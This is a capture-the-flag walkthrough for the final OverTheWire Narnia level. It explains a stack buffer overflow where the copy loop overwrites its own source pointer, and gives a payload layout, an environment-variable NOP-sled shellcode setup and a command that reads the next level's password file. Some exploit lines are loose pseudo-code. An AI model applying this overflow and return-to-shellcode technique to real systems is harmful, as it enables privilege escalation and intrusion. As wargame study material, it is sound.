# OverTheWire — Narnia Level 8 → 9  [FINAL LEVEL]

> Goal: Get narnia9 password from `narnia8`. Result: **`**********`** (hidden) — **Narnia complete!**
> Technique: **self-referential pointer** overflow — keeping the source pointer `blah` unchanged
> while redirecting the return address to env shellcode.

---

## 1. Connection
```bash
ssh narnia8@narnia.labs.overthewire.org -p 2226
```

## 2. Source
```c
int i;                       // GLOBAL (not on stack — "morla" note: reordering fix)
void func(char *b){
    char *blah = b;          // blah = argv[1]
    char bok[20];
    memset(bok, 0, sizeof(bok));
    for(i=0; blah[i] != '\0'; i++)
        bok[i] = blah[i];    // source is blah[i]; blah ITSELF is adjacent to bok!
    printf("%s\n", bok);
}
```

## 3. Disasm — layout
```
8049179:  sub  esp, 0x18
804917f:  mov  [ebp-0x4], eax        ; blah = b   ->  blah @ ebp-0x4
8049186:  lea  eax, [ebp-0x18]       ; bok  @ ebp-0x18 (20 bytes)
...
80491b2:  mov  [ebp+eax*1-0x18], dl  ; bok[i] = blah[i]   (eax = global i)
```
Layout (low→high): `bok[20] (ebp-0x18)` · **`blah ptr (ebp-0x4)`** · saved ebp (ebp) · saved eip (ebp+4).

`bok[i] = *(ebp+i-0x18)` index → address mapping:
| i | written location |
|---|-----------------|
| 0..19 | bok |
| 20..23 | **blah** (pointer) |
| 24..27 | saved ebp |
| 28..31 | **saved eip** |

## 4. The Twist
At `i=20`, `bok[20] = blah[20]` → **overwrites blah's own bytes** → source address shifts →
subsequent `blah[i]` reads come from somewhere entirely different. Naïve overflow crashes:
```bash
./narnia8 $(python3 -c 'print("A"*20)')   # OK
./narnia8 $(python3 -c 'print("A"*21)')   # Segmentation fault (21st byte corrupted blah)
```

## 5. KEY IDEA — keep `blah` fixed at `B0`
If `argv1[20..23]` equals `blah`'s **original value** (`B0 = &argv1[0]`):
- At i=20..23: `*(B0+20..23) = argv1[20..23] = B0` → blah's **own value** is written into it → blah **unchanged**.
- So `bok[i] = *(B0+i) = argv1[i]` (for all i) → the copy is just a plain **memcpy**.
- Then `argv1[28..31]` = saved eip = **shellcode address**.

```
argv1 = "A"*20 + pack(B0) + "BBBB" + pack(SHELLCODE_ADDR)     # 32 bytes, then NULL -> loop ends
        └─ bok ─┘ └blah=B0┘ └s.ebp┘ └─── saved eip ───┘
```
> All 32 bytes must be **null-free** (argv string is cut at null → verify B0/ADDR bytes).
> This makes **gdb trial-and-error unnecessary** — deterministic, single shot.

## 6. Addresses (helper, ASLR disabled)
Find both `B0` (= &argv1) and EGG address with a single helper (15-char path, 32-byte argv[1], EGG exported):
```c
int main(int c,char**v){ printf("B0=%p EGG=%p\n", v[1], getenv("EGG")); return 0; }
```
`SHELLCODE_ADDR = EGG_addr + 10000` (midpoint of 20000-byte NOP sled).

## 7. Exploit
```bash
cd /tmp
export EGG=$(python3 -c 'b"\x90"*20000 + SHELLCODE_57')           # setreuid+execve
INFO=$(/tmp/b0finder12 "$(python3 -c 'b"A"*32')")                 # B0 + EGG addr
# live: B0=ffff8758  EGGA=ffff8f9e  ADDR(=EGGA+10000)=ffffb6ae
ARG1 = b"A"*20 + pack(B0) + b"BBBB" + pack(EGG_addr+10000)
# env not wiped -> cat works; timed feed
python3 -c 'timed: "id; cat /etc/narnia_pass/narnia9"' | /narnia/narnia8 "$ARG1"
```
Output: `uid=14009(narnia9)` → password.



## Lessons
| Topic | Note |
|-------|------|
| Self-referential ptr | Source `blah` is adjacent to target `bok` → copy shifts its own source (trap and primitive in one) |
| Keep blah intact | `argv1[20..23]=B0` → blah gets its own value written → unchanged → plain memcpy |
| Deterministic solve | Instead of gdb trial-and-error, use "blah=B0" → single shot |
| Null-free | argv string cannot contain null (check B0/ADDR bytes) |
| Index table | `bok[i]→ebp+i-0x18`: 20-23 blah, 24-27 s.ebp, **28-31 saved eip** |
